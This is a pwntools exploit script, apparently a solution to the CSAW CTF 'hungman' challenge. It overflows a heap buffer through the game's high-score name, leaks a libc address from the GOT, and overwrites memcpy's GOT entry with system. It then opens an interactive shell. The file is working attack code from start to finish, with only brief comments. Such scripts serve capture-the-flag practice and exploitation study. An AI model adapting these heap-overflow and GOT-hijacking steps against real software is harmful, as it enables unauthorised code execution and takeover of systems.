#!/usr/bin/env python

from pwn import *

#context.log_level = 'DEBUG'
r = process('./hungman-patch')
#r = remote('172.17.0.2', 4000)
#r = remote('pwn.chal.csaw.io', 8003)

libc = ELF('bc.so.6')
#libc =ELF('/home/naetw/heapdebug/src/glibc-2.19/32/lib/libc.so.6')
#libc =ELF('/home/naetw/heapdebug/src/glibc-2.19/64/lib/libc.so.6')

libc_start_got = 0x602068

r.recv()
r.sendline('A'*26)

def game(payload):
    for i in xrange(26):
        r.sendline(chr(97+i))
        x = r.recvline()
        if x[0:4] == "High":
            r.recv(timeout=3)
            r.sendline('y')
            sleep(1)
            r.sendline(payload)
            return
        if x[0:4] == 'Defa':
            r.recvuntil('Continue? ')
            r.sendline('y')
            i = 0
            r.recvline()

# leak libc function address
payload = 'A'*32
payload += p64(0) + p64(0x91) + p32(0x20) + p32(0x1b) + p64(libc_start_got)
r.recvuntil('__________________________\n')
game(payload)
r.recvuntil('player: ')
x = r.recvuntil(' score:')
r.recv()
base = u64(x[0:6] + '\x00' * 2) - libc.symbols['__libc_start_main']
system = base + libc.symbols['system']
info('libc base : {}'.format(hex(base)))
info('system : {}'.format(hex(system)))

# hijack memcpy() and open shell
r.sendline('y')
r.recvuntil('__________________________\n')
payload = 'sh\x00'.ljust(8) + 'A'*8 + p64(system) + p64(base + libc.symbols['malloc']) 
game(payload)
r.recvuntil('Continue? ')
r.sendline('y')
r.recvline()
payload = 'whatever'
game(payload)

r.interactive()
